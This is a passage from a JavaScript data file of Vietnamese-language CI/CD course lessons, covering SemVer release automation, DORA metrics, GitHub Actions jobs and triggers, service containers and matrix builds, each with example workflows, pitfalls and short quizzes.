      { id: "70YgbPh6pXA", title: "Automated GitHub release with Release Please GitHub action", channel: "Ana's Dev Scribbles", lang: "en", minutes: 14, embed: true },
      { id: "mah8PV6ugNY", title: "Automate your GitHub Actions Releases (with Semantic Release)!", channel: "Dave's Dev Channel", lang: "en", minutes: 24, embed: true }
    ],
    sections: [
      {
        h: "SemVer và Conventional Commits",
        p: [
          "SemVer (Semantic Versioning) dùng dạng `MAJOR.MINOR.PATCH`. Tăng MAJOR khi có thay đổi phá vỡ tương thích, MINOR khi thêm tính năng tương thích ngược, PATCH khi sửa lỗi. Nhìn số phiên bản, người dùng biết việc nâng cấp có an toàn không.",
          "Conventional Commits là quy ước viết commit message có cấu trúc, giúp máy đọc được ý nghĩa thay đổi. Khi kết hợp, công cụ có thể tự quyết định phiên bản tiếp theo, tự sinh changelog và tạo release."
        ],
        list: [
          "`fix: sửa lỗi phân trang` → tăng PATCH.",
          "`feat: thêm API xuất CSV` → tăng MINOR.",
          "`feat!: đổi định dạng response` hoặc footer `BREAKING CHANGE:` → tăng MAJOR.",
          "`chore:`, `docs:`, `test:`, `ci:` → mặc định không tạo release."
        ]
      },
      {
        h: "release-please và semantic-release",
        p: [
          "semantic-release chạy trên mỗi push vào main: phân tích commit từ tag gần nhất, tính version, tạo tag, GitHub Release và có thể publish package. Mọi thứ diễn ra ngay, không có bước người xem.",
          "release-please của Google theo cách khác: nó mở và cập nhật một Release PR chứa changelog và version mới. Khi bạn merge PR đó, tag và GitHub Release mới được tạo. Cách này cho đội một điểm kiểm soát là khi nào thì release."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/release.yml",
          src: `name: Release
on:
  push:
    branches: [main]

permissions:
  contents: write        # tạo tag và GitHub Release
  issues: write
  pull-requests: write

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0     # cần toàn bộ lịch sử để đọc commit từ tag trước
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: 24
          cache: npm
      - run: npm ci
      - run: npx semantic-release
        env:
          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}`
        }
      },
      {
        h: "Kiểm soát chất lượng commit message",
        p: [
          "Tự động hoá chỉ đúng khi commit message đúng quy ước. Dùng commitlint trong git hook (husky) và trong CI để kiểm tra. Với squash merge, tiêu đề PR trở thành commit message, nên hãy kiểm tra tiêu đề PR.",
          "Với dịch vụ backend deploy liên tục, số version ít quan trọng hơn commit SHA. Nhưng với thư viện, SDK, Helm chart hay API công khai, SemVer tự động giúp người dùng tin tưởng việc nâng cấp. Tag release (ví dụ `v1.4.0`) cũng có thể là trigger để workflow deploy production."
        ]
      },
      {
        h: "Tag release kích hoạt deploy",
        p: [
          "Một mô hình phổ biến: mỗi commit trên main tự lên staging, còn production chỉ deploy khi có tag release. Workflow production lắng nghe `on: push: tags: [\"v*\"]` hoặc sự kiện `release` với `types: [published]`. Cách này cho đội một nhịp release rõ ràng và changelog đi kèm mỗi lần lên production.",
          "Khi dùng mô hình này, image vẫn phải là image đã build từ commit được gắn tag, không build lại. Bạn chỉ gắn thêm tag version vào image đã có, ví dụ dùng `docker buildx imagetools create` để thêm tag mới cho cùng digest."
        ]
      }
    ],
    summary: [
      "SemVer: MAJOR phá vỡ tương thích, MINOR thêm tính năng, PATCH sửa lỗi.",
      "Conventional Commits giúp công cụ tự tính version và sinh changelog.",
      "semantic-release release ngay khi push; release-please mở Release PR để duyệt.",
      "Cần `fetch-depth: 0` và quyền `contents: write` để tạo tag."
    ],
    pitfalls: [
      "Checkout nông (mặc định depth 1) nên công cụ không thấy tag cũ và tính sai version.",
      "Commit message tuỳ tiện như `update`, `fix bug`: changelog vô nghĩa và version tăng sai.",
      "Cấp `contents: write` cho mọi job thay vì chỉ job release."
    ],
    quiz: [
      {
        q: "Commit `feat!: đổi định dạng response` từ version 2.3.1 sẽ tạo version nào?",
        options: ["2.3.2", "2.4.0", "3.0.0", "2.3.1-beta"],
        answer: 2,
        explain: "Dấu `!` đánh dấu breaking change nên tăng MAJOR thành 3.0.0. `feat` thường tăng MINOR, `fix` tăng PATCH."
      },
      {
        q: "Điểm khác nhau chính giữa release-please và semantic-release?",
        options: ["release-please không sinh changelog, semantic-release thì có","release-please mở Release PR, merge PR đó mới tạo release","semantic-release chỉ chạy được trên GitLab CI","semantic-release phải merge một PR mới tạo được tag"],
        answer: 1,
        explain: "release-please thêm điểm kiểm soát bằng Release PR; semantic-release release ngay khi có push lên nhánh release. Cả hai đều sinh changelog và đều dùng được với GitHub."
      },
      {
        q: "Vì sao workflow release cần `fetch-depth: 0`?",
        options: ["Để job checkout chạy nhanh hơn","Để npm tải dependency từ cache","Để có lịch sử commit và tag cũ khi tính version","Để bật cache của setup-node"],
        answer: 2,
        explain: "Mặc định checkout chỉ lấy một commit. Công cụ cần tag trước đó và các commit sau nó để quyết định version."
      }
    ]
  },
  "p08.m0.t7": {
    videos: [
      { id: "_IKB4h9e4NA", title: "State of the Art of DORA Metrics & AI Integration • Nathen Harvey & Charles Humble • GOTO 2025", channel: "GOTO Conferences", lang: "en", minutes: 45, embed: true }
    ],
    sections: [
      {
        h: "Các chỉ số DORA",
        p: [
          "DORA (DevOps Research and Assessment) là chương trình nghiên cứu nhiều năm về hiệu quả giao phần mềm. Trong nhiều năm, DORA nổi tiếng với bộ \"four keys\" (bốn chỉ số). Từ báo cáo 2024, dora.dev dùng năm chỉ số, chia thành hai nhóm: throughput (lượng thay đổi đi qua hệ thống nhanh tới đâu) và instability (các lần deploy hỏng tới đâu). Điểm quan trọng từ nghiên cứu là hai nhóm không đối nghịch: đội giỏi thường vừa nhanh vừa ổn định.",
          "Nhóm throughput gồm ba chỉ số đầu, nhóm instability gồm hai chỉ số sau. Chỉ số thứ năm (deployment rework rate) là mới; nếu bạn đọc tài liệu cũ chỉ thấy bốn chỉ số, đó là bộ four keys trước 2024."
        ],
        list: [
          "Change lead time: thời gian từ lúc thay đổi được commit vào version control tới lúc nó được deploy lên production.",
          "Deployment frequency: số lần deploy lên production trong một khoảng thời gian, hoặc khoảng cách giữa hai lần deploy.",
          "Failed deployment recovery time: thời gian khôi phục sau một lần deploy hỏng cần can thiệp ngay. Tài liệu cũ gọi gần giống là time to restore service (MTTR).",
          "Change fail rate: tỷ lệ deploy cần can thiệp ngay sau khi deploy, thường dẫn tới rollback hoặc hotfix.",
          "Deployment rework rate: tỷ lệ deploy không nằm trong kế hoạch mà phải làm vì có sự cố trên production."
        ]
      },
      {
        h: "Đo như thế nào",
        p: [
          "Bạn không cần công cụ đắt tiền để bắt đầu. Dữ liệu có sẵn trong hệ thống bạn đang dùng: lịch sử deployment của GitHub Environments, thời gian commit, và hệ thống quản lý sự cố. Deployment frequency đếm số lần job deploy production thành công. Change lead time lấy thời điểm deploy trừ thời điểm commit. Change fail rate và deployment rework rate cần đánh dấu deploy nào gây sự cố hoặc là deploy chữa cháy, thường liên kết với incident, rollback hay hotfix.",
          "Ví dụ dưới đây dùng GitHub CLI lấy danh sách deployment của environment production để đếm tần suất."
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `# Liệt kê 100 deployment production gần nhất (số lượng và thời điểm)
gh api "repos/my-org/task-api/deployments?environment=production&per_page=100" \\
  --jq '.[] | [.created_at, .sha[0:7]] | @tsv'

# Đếm deployment theo ngày
gh api "repos/my-org/task-api/deployments?environment=production&per_page=100" \\
  --jq '.[].created_at[0:10]' | sort | uniq -c`
        }
      },
      {
        h: "Dùng đúng cách",
        p: [
          "DORA dùng để đội tự cải thiện, không phải để xếp hạng cá nhân hay so sánh các đội với nhau. Khi chỉ số trở thành mục tiêu thưởng phạt, người ta sẽ tìm cách làm đẹp số liệu: chia deploy thành nhiều lần vô nghĩa, không ghi nhận sự cố.",
          "Hãy xem chỉ số theo xu hướng. Lead time dài thường do PR lớn, review chậm hoặc pipeline chậm. Change fail rate cao thường do test yếu hoặc thay đổi lớn. Mỗi thực hành trong chương này, như trunk-based, build once, canary, feature flag, rollback tự động, đều tác động trực tiếp tới một hoặc nhiều chỉ số DORA."
        ]
      }
    ],
    summary: [
      "Năm chỉ số hiện hành: change lead time, deployment frequency, failed deployment recovery time, change fail rate, deployment rework rate.",
      "Ba chỉ số đầu thuộc nhóm throughput, hai chỉ số sau thuộc nhóm instability.",
      "Dữ liệu có thể lấy từ lịch sử deployment, git và hệ thống sự cố.",
      "Dùng để đội tự cải thiện theo xu hướng, không để đánh giá cá nhân."
    ],
    pitfalls: [
      "Biến DORA thành KPI thưởng phạt, dẫn tới số liệu bị làm đẹp.",
      "Chỉ đo tốc độ mà bỏ qua change fail rate: deploy nhiều nhưng hỏng nhiều.",
      "Đo lead time từ lúc tạo ticket thay vì từ commit, làm lẫn thời gian lập kế hoạch vào chỉ số."
    ],
    quiz: [
      {
        q: "Chỉ số nào KHÔNG thuộc bộ chỉ số DORA?",
        options: ["Deployment frequency","Change lead time","Số dòng code mỗi ngày","Deployment rework rate"],
        answer: 2,
        explain: "Số dòng code không phải chỉ số DORA và cũng không phản ánh hiệu quả. Ba lựa chọn còn lại đều thuộc bộ năm chỉ số hiện hành trên dora.dev."
      },
      {
        q: "Change lead time (lead time for changes) đo khoảng thời gian nào?",
        options: ["Từ lúc tạo ticket tới lúc đóng ticket","Từ lúc commit tới lúc chạy trên production","Thời gian chạy một lần pipeline CI","Thời gian khôi phục sau deploy lỗi"],
        answer: 1,
        explain: "Change lead time tính từ lúc commit vào version control tới lúc deploy lên production. Thời gian khôi phục là chỉ số khác (failed deployment recovery time); thời gian pipeline chỉ là một phần của lead time."
      },
      {
        q: "Kết luận quan trọng từ nghiên cứu DORA về tốc độ và độ ổn định là gì?",
        options: ["Phải hy sinh một trong hai","Nên deploy ít đi để ổn định hơn","Tốc độ giao hàng không đo được","Đội hiệu quả thường đạt tốt cả hai"],
        answer: 3,
        explain: "Nghiên cứu cho thấy tốc độ và ổn định đi cùng nhau: thay đổi nhỏ, thường xuyên vừa nhanh vừa ít rủi ro."
      }
    ]
  },
  "p08.m1.t0": {
    videos: [
      { id: "ZKaDy0mNHGs", title: "Github Actions - CI/CD chưa bao giờ dễ hơn thế", channel: "Holetex", lang: "vi", minutes: 32, embed: true },
      { id: "BQrohJ3PT7I", title: "How to use GitHub Actions | GitHub for Beginners", channel: "GitHub", lang: "en", minutes: 8, embed: true }
    ],
    sections: [
      {
        h: "Bốn khái niệm nền tảng",
        p: [
          "GitHub Actions tổ chức công việc theo bốn tầng. Hiểu rõ ranh giới giữa chúng giúp bạn biết cái gì chạy song song, cái gì dùng chung file, và lỗi xảy ra ở đâu."
        ],
        list: [
          "Workflow: một file YAML trong `.github/workflows/`, được kích hoạt bởi sự kiện (push, pull_request...).",
          "Job: một nhóm step chạy trên cùng một runner. Mặc định các job chạy song song.",
          "Step: một lệnh shell (`run`) hoặc một action (`uses`). Các step trong job chạy tuần tự và dùng chung filesystem.",
          "Runner: máy thực thi job, có thể là runner do GitHub cung cấp (`ubuntu-latest`) hoặc self-hosted."
        ]
      },
      {
        h: "Job cô lập với nhau",
        p: [
          "Mỗi job chạy trên một máy ảo mới tinh. File bạn tạo ở job `build` không tự có mặt ở job `deploy`. Muốn chuyển dữ liệu, bạn dùng artifact (file) hoặc `outputs` (chuỗi ngắn). Biến môi trường đặt trong một step cũng không tự sang step sau; muốn vậy bạn ghi vào file `$GITHUB_ENV`.",
          "`needs` tạo phụ thuộc: job chỉ chạy khi các job nó cần đã thành công. Kết hợp `needs` và `if` để tạo luồng phức tạp, ví dụ job thông báo chạy cả khi job khác lỗi bằng `if: always()`."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/basics.yml",
          src: `name: Basics
on: push

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: \${{ steps.ver.outputs.version }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - id: ver
        run: echo "version=$(node -p "require('./package.json').version")" >> "$GITHUB_OUTPUT"
      - run: echo "APP_ENV=ci" >> "$GITHUB_ENV"
      - run: echo "Step sau thấy APP_ENV=$APP_ENV"

  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "chạy song song với build"

  report:
    needs: [build, test]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - run: echo "version \${{ needs.build.outputs.version }}, test = \${{ needs.test.result }}"`
        }
      },
      {
        h: "Mẹo đọc và gỡ lỗi",
        p: [
          "Khi job lỗi, hãy xem step nào đỏ và đọc log của đúng step đó. Mỗi step `run` mặc định chạy bằng bash với `-e` trên Linux, nên lệnh đầu tiên lỗi sẽ dừng step. Có thể bật log debug bằng cách đặt biến hoặc secret `ACTIONS_STEP_DEBUG` là `true`, hoặc chọn Re-run with debug logging.",
          "Về chi phí: runner của GitHub tính theo phút với repo private, và mỗi job có thời gian khởi động riêng. Tách quá nhiều job nhỏ làm tốn thời gian khởi động và cài dependency lặp lại; gộp quá nhiều thì mất song song. Hãy tách job theo ranh giới có ý nghĩa như lint, test, build image, deploy."
        ]
      }
    ],
    summary: [
      "Workflow chứa job, job chứa step, job chạy trên runner.",
      "Job chạy song song trên máy riêng; step trong job chạy tuần tự và chung filesystem.",
      "Dùng `needs` tạo phụ thuộc, `outputs` và artifact để truyền dữ liệu giữa job.",
      "Ghi vào `$GITHUB_OUTPUT` và `$GITHUB_ENV` để truyền giá trị giữa các step."
    ],
    pitfalls: [
      "Tạo file ở job này rồi mong job khác đọc được: phải dùng upload/download artifact.",
      "Dùng `export VAR=...` trong một step và mong step sau thấy: phải ghi vào `$GITHUB_ENV`.",
      "Dùng cú pháp cũ `::set-output` đã bị deprecated; hãy dùng `$GITHUB_OUTPUT`."
    ],
    quiz: [
      {
        q: "Hai job không có `needs` trong cùng workflow sẽ chạy thế nào?",
        options: ["Tuần tự theo thứ tự trong file", "Song song trên các runner riêng", "Trên cùng một máy", "Chỉ job đầu tiên chạy"],
        answer: 1,
        explain: "Mặc định các job chạy song song, mỗi job trên runner riêng. Muốn tuần tự phải dùng `needs`."
      },
      {
        q: "Cách đúng để truyền một chuỗi ngắn từ job build sang job deploy?",
        options: ["`export` biến trong step của job build","Job `outputs`, đọc qua `needs.build.outputs`","Ghi vào file /tmp trên runner của job build","Ghi vào `$GITHUB_ENV` trong job build"],
        answer: 1,
        explain: "Job outputs là cơ chế chuẩn cho giá trị ngắn. Biến export, file /tmp và `$GITHUB_ENV` chỉ tồn tại trong job build (`$GITHUB_ENV` chỉ truyền giữa các step cùng job)."
      },
      {
        q: "`if: always()` trên một job có tác dụng gì?",
        options: ["Job chạy mọi lúc kể cả khi không có trigger","Job vẫn chạy dù job trong `needs` thất bại","Job tự chạy lại vô hạn khi bị lỗi","Job bỏ qua mọi step bên trong nó"],
        answer: 1,
        explain: "`always()` khiến điều kiện đúng bất kể kết quả job trước, kể cả khi run bị huỷ; hữu ích cho báo cáo và dọn dẹp. Muốn bỏ qua khi bị huỷ, dùng `!cancelled()`. Nó không tạo trigger mới."
      }
    ]
  },
  "p08.m1.t1": {
    sections: [
      {
        h: "Sự kiện kích hoạt workflow",
        p: [
          "Khối `on:` quyết định khi nào workflow chạy. Chọn đúng trigger giúp tiết kiệm phút runner và tránh chạy những thứ nguy hiểm vào sai thời điểm."
        ],
        list: [
          "`push`: khi có commit đẩy lên nhánh hoặc tag; lọc bằng `branches`, `tags`, `paths`.",
          "`pull_request`: khi PR được mở, cập nhật; chạy với quyền đọc và không có secret nếu PR đến từ fork.",
          "`workflow_dispatch`: chạy tay từ giao diện hoặc CLI, có thể khai báo `inputs`.",
          "`schedule`: chạy theo cron, múi giờ UTC, ví dụ quét bảo mật hằng đêm.",
          "`release`: khi GitHub Release được tạo hoặc publish.",
          "`workflow_call`: biến workflow thành reusable workflow được workflow khác gọi."
        ]
      },
      {
        h: "Ví dụ nhiều trigger với bộ lọc",
        p: [
          "Workflow dưới đây chạy CI cho PR vào main, bỏ qua PR chỉ sửa tài liệu; chạy khi push tag dạng `v*` để release; cho phép chạy tay với tham số chọn môi trường; và quét định kỳ lúc 2 giờ sáng giờ Việt Nam (19:00 UTC)."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/triggers.yml",
          src: `name: Triggers demo
on:
  pull_request:
    branches: [main]
    paths-ignore:
      - "docs/**"
      - "**.md"
  push:
    tags: ["v*"]
  workflow_dispatch:
    inputs:
      environment:
        description: "Môi trường deploy"
        type: choice
        options: [staging, production]
        default: staging
  schedule:
    - cron: "0 19 * * *"   # 02:00 giờ Việt Nam

permissions:
  contents: read

jobs:
  info:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "event: \${{ github.event_name }}"
          echo "ref:   \${{ github.ref }}"
          echo "env:   \${{ inputs.environment }}"`
        }
      },
      {
        h: "Các lưu ý quan trọng",
        p: [
          "Khi dùng cả `branches` và `paths` cho cùng sự kiện, workflow chỉ chạy khi thoả cả hai. Với `schedule`, khoảng cách ngắn nhất là 5 phút, GitHub có thể trễ (thậm chí bỏ qua) lần chạy vào giờ cao điểm như đầu mỗi giờ, và workflow schedule chỉ chạy trên commit mới nhất của nhánh mặc định. Ở repo công khai, workflow schedule có thể bị tự động tắt khi repo không có hoạt động trong 60 ngày.",
          "Hãy phân biệt `pull_request` và `pull_request_target`. `pull_request_target` chạy trong ngữ cảnh nhánh đích, có secret và token có quyền ghi. Nếu bạn checkout code của PR từ fork và chạy nó trong workflow này, kẻ tấn công có thể đánh cắp secret. Bài bảo mật pipeline sẽ nói kỹ hơn.",
          "Workflow bị bỏ qua do lọc `paths` sẽ không báo trạng thái. Nếu check đó là bắt buộc trong branch protection, PR sẽ bị treo. Giải pháp là lọc ở cấp job bằng điều kiện, hoặc dùng một job tổng hợp luôn chạy."
        ]
      }
    ],
    summary: [
      "`on:` định nghĩa sự kiện kích hoạt: push, pull_request, workflow_dispatch, schedule, release, workflow_call.",
      "Lọc bằng `branches`, `tags`, `paths` và các biến thể `-ignore`.",
      "Cron của `schedule` dùng giờ UTC và chỉ chạy trên nhánh mặc định.",
      "Cẩn trọng với `pull_request_target` vì có secret và quyền ghi."
    ],
    pitfalls: [
      "Viết cron theo giờ Việt Nam, job chạy lệch 7 tiếng.",
      "Dùng `paths` cho workflow có required check, khiến PR không liên quan bị treo.",
      "Dùng `pull_request_target` rồi checkout và chạy code của PR."
    ],
    quiz: [
      {
        q: "Cron `0 19 * * *` trong GitHub Actions chạy lúc mấy giờ ở Việt Nam (UTC+7)?",
        options: ["19:00", "12:00", "02:00 sáng hôm sau", "07:00"],
        answer: 2,
        explain: "Cron dùng UTC. 19:00 UTC cộng 7 giờ là 02:00 sáng hôm sau giờ Việt Nam."
      },
      {
        q: "Trigger nào cho phép chạy workflow bằng tay kèm tham số?",
        options: ["schedule", "workflow_dispatch", "push", "merge_group"],
        answer: 1,
        explain: "`workflow_dispatch` hỗ trợ `inputs` và nút Run workflow. Các trigger còn lại được kích hoạt tự động bởi sự kiện."
      },
      {
        q: "Vì sao `pull_request_target` nguy hiểm khi kết hợp với checkout code PR từ fork?",
        options: ["Vì nó có secret và token ghi, còn code PR là code lạ","Vì nó chạy chậm hơn nhiều so với pull_request","Vì nó không hỗ trợ runner Linux","Vì nó tự xoá nhánh main sau khi chạy"],
        answer: 0,
        explain: "`pull_request_target` chạy với quyền của repo đích. Chạy code không tin cậy trong ngữ cảnh đó có thể làm lộ secret."
      }
    ]
  },
  "p08.m1.t2": {
    sections: [
      {
        h: "Integration test cần dịch vụ thật",
        p: [
          "Unit test với mock rất nhanh nhưng không bắt được lỗi SQL, lỗi migration, hay khác biệt hành vi của Postgres thật. Service container cho phép chạy Postgres, Redis hay bất kỳ image nào ngay bên cạnh job, sống cùng vòng đời job: khởi động trước step đầu tiên và bị xoá khi job kết thúc.",
          "Service container chỉ hỗ trợ runner Linux. Trên runner của GitHub, Docker đã được cài sẵn nên bạn không cần làm gì thêm."
        ]
      },
      {
        h: "Ví dụ Postgres và Redis",
        p: [
          "Khi job chạy trực tiếp trên runner (không có `container:`), bạn phải map port và kết nối qua `localhost`. Health check giúp job chờ tới khi database sẵn sàng trước khi chạy step."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/integration.yml",
          src: `name: Integration
on: pull_request

permissions:
  contents: read

jobs:
  integration:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:18-alpine
        env:
          POSTGRES_USER: app
          POSTGRES_PASSWORD: app
          POSTGRES_DB: app_test
        ports: ["5432:5432"]
        options: >-
          --health-cmd "pg_isready -U app"
          --health-interval 5s
          --health-retries 10
      redis:
        image: redis:8-alpine
        ports: ["6379:6379"]
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 5s
          --health-retries 10
    env:
      DATABASE_URL: postgres://app:app@localhost:5432/app_test
      REDIS_URL: redis://localhost:6379
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: 24
          cache: npm
      - run: npm ci
      - run: npx prisma migrate deploy
      - run: npm run test:integration`
        }
      },
      {
        h: "Chạy job trong container",
        p: [
          "Nếu khai báo `container: node:24-alpine` cho job, mọi step chạy trong container đó và các service nằm cùng mạng Docker. Khi đó bạn kết nối bằng tên service làm hostname, ví dụ `postgres:5432`, và không cần map port.",
          "So sánh với Testcontainers: Testcontainers khởi động container từ chính code test, giúp test chạy giống nhau trên máy dev và CI. Service container thì đơn giản hơn, khai báo ngay trong workflow. Cả hai đều ổn; quan trọng là test chạy trên cùng phiên bản database với production.",
          "Mỗi test nên tự dọn dữ liệu, hoặc chạy trong transaction rồi rollback, để test không phụ thuộc thứ tự."
        ]
      },
      {
        h: "Mẹo để integration test nhanh và ổn định",
        p: [
          "Tách unit test và integration test thành hai job riêng: unit test phản hồi trong một phút, integration test chạy song song mà không làm chậm phản hồi đầu tiên. Chạy toàn bộ migration trên database trống ở mỗi lần CI có lợi ích phụ: phát hiện migration bị lỗi hoặc phụ thuộc thứ tự trước khi nó chạy trên production.",
          "Luôn đặt `timeout-minutes` cho job để một test treo không giữ runner hàng giờ. Seed dữ liệu tối thiểu mà mỗi test cần, thay vì một bản dump lớn từ production vừa chậm vừa có nguy cơ lộ dữ liệu cá nhân.",
          "Với dịch vụ không có image nhẹ, hoặc cần cấu hình phức tạp, hãy cân nhắc Testcontainers hoặc Docker Compose trong step, đổi lại cấu hình dài hơn."
        ]
      }
    ],
    summary: [
      "Service container chạy database, cache thật bên cạnh job để integration test.",
      "Job trên runner: map port, dùng `localhost`. Job trong container: dùng tên service làm hostname.",
      "Luôn khai báo health check để step không chạy trước khi dịch vụ sẵn sàng.",
      "Dùng cùng phiên bản database với production."
    ],
    pitfalls: [
      "Thiếu health check, test chạy khi Postgres chưa nhận kết nối và lỗi ngẫu nhiên.",
      "Dùng `localhost` khi job chạy trong container, hoặc dùng tên service khi job chạy trên runner.",
      "Test phụ thuộc dữ liệu do test khác tạo ra, chạy song song thì lỗi."
    ],
    quiz: [
      {
        q: "Job chạy trực tiếp trên `ubuntu-latest` với service `postgres` map port 5432. Host kết nối là gì?",
        options: ["postgres", "localhost", "db.internal", "0.0.0.0:80"],
        answer: 1,
        explain: "Khi job chạy trên runner, service được map port ra máy chủ nên dùng `localhost`. Tên service chỉ dùng khi job chạy trong container."
      },
      {
        q: "Tác dụng của `--health-cmd` trong options của service?",
        options: ["Giới hạn RAM của container service","Cho runner chờ service khoẻ rồi mới chạy step","Tự động chạy migration khi service khởi động","Xoá dữ liệu của service sau khi test"],
        answer: 1,
        explain: "Health check cho runner biết khi nào container sẵn sàng. Nó không chạy migration hay dọn dữ liệu."
      },
      {
        q: "Service container hỗ trợ loại runner nào?",
        options: ["Chỉ Windows", "Chỉ macOS", "Linux", "Mọi hệ điều hành như nhau"],
        answer: 2,
        explain: "Service container yêu cầu runner Linux có Docker. Runner Windows và macOS không hỗ trợ tính năng này."
      }
    ]
  },
  "p08.m1.t3": {
    videos: [
      { id: "Ijz_6vPa8RI", title: "Mastering Matrix Jobs in GitHub Actions", channel: "Mickey Gousset", lang: "en", minutes: 16, embed: true }
    ],
    sections: [
      {
        h: "Matrix: một job, nhiều cấu hình",
        p: [
          "Matrix build tạo nhiều bản chạy của cùng một job với các tổ hợp tham số khác nhau. Thư viện cần chạy trên nhiều phiên bản Node, CLI cần chạy trên Linux, macOS và Windows. Thay vì copy job nhiều lần, bạn khai báo `strategy.matrix`.",
          "Với ứng dụng backend chỉ chạy một phiên bản Node trên production, matrix ít cần thiết hơn. Nhưng nó vẫn hữu ích khi chuẩn bị nâng phiên bản: chạy song song phiên bản hiện tại và phiên bản mới để thấy trước lỗi."
        ]
      },
      {
        h: "Ví dụ với include và exclude",
        p: [
          "Matrix dưới đây tạo tổ hợp 2 phiên bản Node × 2 hệ điều hành, bỏ bớt một tổ hợp bằng `exclude`, và thêm một tổ hợp đặc biệt có biến riêng bằng `include`."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/matrix.yml",
          src: `name: Matrix
on: pull_request

permissions:
  contents: read

jobs:
  test:
    runs-on: \${{ matrix.os }}
    strategy:
      fail-fast: false
      max-parallel: 4
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [22, 24]
        exclude:
          - os: windows-latest
            node: 22
        include:
          - os: ubuntu-latest
            node: 24
            coverage: true
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: \${{ matrix.node }}
          cache: npm
      - run: npm ci
      - run: npm test
      - if: matrix.coverage
        run: npm run test:coverage`
        }
      },
      {
        h: "fail-fast và chi phí",
        p: [
          "Mặc định `fail-fast` là `true`: một tổ hợp lỗi thì các tổ hợp đang chạy bị huỷ. Điều này tiết kiệm phút runner nhưng bạn không biết lỗi có xảy ra ở mọi tổ hợp hay chỉ một. Khi debug vấn đề tương thích, đặt `fail-fast: false` để thấy toàn cảnh.",
          "Lưu ý `include` có hai hành vi: nếu các khoá trong phần tử include khớp một tổ hợp có sẵn, nó bổ sung biến vào tổ hợp đó (như `coverage: true` ở trên); nếu không khớp, nó thêm tổ hợp mới. Matrix còn có thể dùng để chia nhỏ bộ test lớn thành nhiều shard chạy song song.",
          "Chi phí tăng theo số tổ hợp. Runner Windows và macOS tính phút đắt hơn Linux với repo private. Chỉ đưa vào matrix những thứ bạn thực sự hỗ trợ."
        ]
      },
      {
        h: "Chia shard bộ test lớn",
        p: [
          "Khi bộ test chạy 20 phút, matrix có thể chia nó thành nhiều phần chạy song song. Jest và Playwright đều hỗ trợ cờ `--shard=chỉ-số/tổng`. Ba shard gần như chia ba thời gian chờ, đổi lại tốn thêm phút runner cho phần cài đặt lặp lại ở mỗi shard."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/test-shards.yml",
          src: `name: Test shards
on: pull_request

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        shard: [1, 2, 3]
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: 24
          cache: npm
      - run: npm ci
      - run: npx jest --shard=\${{ matrix.shard }}/3`
        }
      }
    ],
    summary: [
      "`strategy.matrix` tạo nhiều bản chạy của một job theo tổ hợp tham số.",
      "`exclude` bỏ tổ hợp, `include` thêm tổ hợp hoặc thêm biến vào tổ hợp có sẵn.",
      "`fail-fast: false` giúp thấy kết quả mọi tổ hợp khi debug.",
      "Matrix cũng dùng để chia shard test chạy song song."
    ],
    pitfalls: [
      "Đặt required check theo tên job matrix: tên thực tế có hậu tố như `test (ubuntu-latest, 24)`, đổi matrix là check bị treo.",
      "Matrix quá rộng với runner macOS/Windows, tốn phút mà không mang lại giá trị.",
      "Giữ phiên bản Node đã hết hỗ trợ trong matrix quá lâu."
    ],
    quiz: [
      {
        q: "Matrix `os: [a, b]` và `node: [22, 24]` không có include/exclude tạo bao nhiêu job?",
        options: ["2", "3", "4", "6"],
        answer: 2,
        explain: "Matrix tạo tích Descartes: 2 × 2 = 4 tổ hợp."
      },
      {
        q: "`fail-fast: true` (mặc định) có tác dụng gì?",
        options: ["Chạy lại job lỗi", "Huỷ các tổ hợp còn lại khi một tổ hợp lỗi", "Bỏ qua lỗi", "Chạy tuần tự các tổ hợp"],
        answer: 1,
        explain: "fail-fast huỷ các job cùng matrix khi một job lỗi để tiết kiệm tài nguyên. Nó không retry và không bỏ qua lỗi."
      },
      {
        q: "Phần tử `include` có khoá khớp một tổ hợp có sẵn sẽ làm gì?",
        options: ["Tạo tổ hợp trùng lặp", "Thêm biến mới vào tổ hợp đó", "Xoá tổ hợp đó", "Báo lỗi cú pháp"],
        answer: 1,
        explain: "Khi khớp, include bổ sung giá trị vào tổ hợp có sẵn. Chỉ khi không khớp nó mới tạo tổ hợp mới."
      }
    ]
  },
  "p08.m1.t4": {
    videos: [
      { id: "7PVUjRXUY0o", title: "Cache Management with GitHub actions", channel: "Mickey Gousset", lang: "en", minutes: 12, embed: true }
    ],
    sections: [
      {
        h: "Cache và artifact khác nhau thế nào",
        p: [
